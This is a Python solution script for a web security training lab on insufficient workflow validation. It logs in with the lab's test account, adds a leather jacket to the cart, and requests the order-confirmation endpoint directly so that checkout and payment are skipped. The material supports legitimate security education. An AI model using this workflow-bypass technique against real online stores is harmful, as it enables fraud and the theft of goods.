########################################################################
#
# Author: Ahmed Elqalawy (@elqal3awii)
#
# Date: 27/10/2023
#
# Lab: Insufficient workflow validation
#
# Steps: 1. Fetch login page
#        2. Extract the csrf token and session cookie
#        3. Login as wiener
#        4. Add the leather jacket to the cart
#        5. Confirm order directly without checking out
#
########################################################################


###########
# imports
###########
import requests
import re
from colorama import Fore


###########
# Main
###########

# change this to your lab URL
url = "https://0a45003b04f03b7480e8adde007a0076.web-security-academy.net"

try:  
    # fetch the login page
    get_login = requests.get(f"{url}/login")

except:
    print(Fore.RED + "[!] Failed to fetch the login page through exception")
    exit(1) 

print(Fore.WHITE + "⦗1⦘ Fetching the login page.. " + Fore.GREEN + "OK")

# get session cookie
session = get_login.cookies.get("session")

# extract the csrf token
csrf = re.findall("csrf.+value=\"(.+)\"", get_login.text)[0]

print(Fore.WHITE + "⦗2⦘ Extracting the csrf token and session cookie to login.. " + Fore.GREEN + "OK")

# set credentials
data = {
    "username": "wiener",
    "password": "peter",
    "csrf": csrf
}

# set session cookie
cookies = {
    "session": session
}

try:    
    # login as wiener
    login = requests.post(f"{url}/login", data, cookies=cookies, allow_redirects=False)
    
except:
    print(Fore.RED + "[!] Failed to login as wiener through exception")
    exit(1)

print(Fore.WHITE + "⦗3⦘ Logging in as wiener.. " + Fore.GREEN + "OK")

# get the new session
session = login.cookies.get("session")

# set session cookie
cookies = {
    "session": session
}

# data to send via POST
data = {
    "productId": "1",
    "redir": "PRODUCT",
    "quantity": "1",
}

try:  
    # add the leather jacket to the cart
    wiener = requests.post(f"{url}/cart", data, cookies=cookies)
    
except:
    print(Fore.RED + "[!] Failed to add the leather jacket to the cart through exception")
    exit(1)

print(Fore.WHITE + "⦗4⦘ Adding the leather jacket to the cart.. " + Fore.GREEN + "OK")

try:  
    # confirm order directly without checking out
    wiener = requests.get(f"{url}/cart/order-confirmation?order-confirmed=true", cookies=cookies)
    
except:
    print(Fore.RED + "[!] Failed to fetch wiener's cart through exception")
    exit(1)

print(Fore.WHITE + "⦗5⦘ Confirming order directly without checking out.. " + Fore.GREEN + "OK")
print(Fore.WHITE + "🗹 Check your browser, it should be marked now as " + Fore.GREEN + "solved")


